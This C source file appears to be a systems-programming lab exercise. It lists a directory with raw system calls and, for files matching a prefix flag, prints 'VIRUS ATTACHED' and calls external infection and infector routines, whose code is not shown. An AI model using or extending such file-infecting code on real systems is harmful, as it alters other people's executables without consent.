#include "util.h"

#define SYS_OPEN 5
#define SYS_WRITE 4
#define SYS_GETDENTS 141
#define STDOUT 1

extern void infection();
extern void infector(char* filename);
extern int system_call(int, int, int, int);

struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};

int main (int argc , char* argv[], char* envp[]) {
    char buf[8192];
    int fd, nread, bpos;
    struct linux_dirent *d;
    char *prefix = 0;

    for(int i=1; i<argc; i++) {
        if(strncmp(argv[i], "-a", 2) == 0) prefix = argv[i] + 2;
    }

    fd = system_call(SYS_OPEN, (int)".", 0, 0);
    if(fd < 0) system_call(1, 0x55, 0, 0);

    nread = system_call(SYS_GETDENTS, fd, (int)buf, 8192);
    
    for (bpos = 0; bpos < nread;) {
        d = (struct linux_dirent *) (buf + bpos);
        
        if (!prefix || (prefix[0] == d->d_name[0])) {
            system_call(SYS_WRITE, STDOUT, (int)d->d_name, strlen(d->d_name));
            if (prefix && prefix[0] == d->d_name[0]) {
                system_call(SYS_WRITE, STDOUT, (int)" VIRUS ATTACHED", 15);
                infection();
                infector(d->d_name);
            }
            system_call(SYS_WRITE, STDOUT, (int)"\n", 1);
        }
        bpos += d->d_reclen;
    }
    return 0;
}